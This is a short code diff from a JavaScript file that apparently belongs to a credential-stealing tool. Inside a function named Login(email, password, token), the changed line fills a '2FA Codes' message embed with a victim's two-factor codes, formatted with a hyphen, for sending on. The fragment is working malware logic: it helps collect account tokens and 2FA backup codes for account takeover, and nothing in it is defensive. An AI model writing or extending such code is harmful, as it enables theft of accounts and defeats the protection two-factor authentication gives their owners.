@@ -522,7 +522,7 @@ function Login(email, password, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes_	_",
-								"description": `${baseuri}`,
+								"description": `${r[z].code.insert(4, "-")}`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
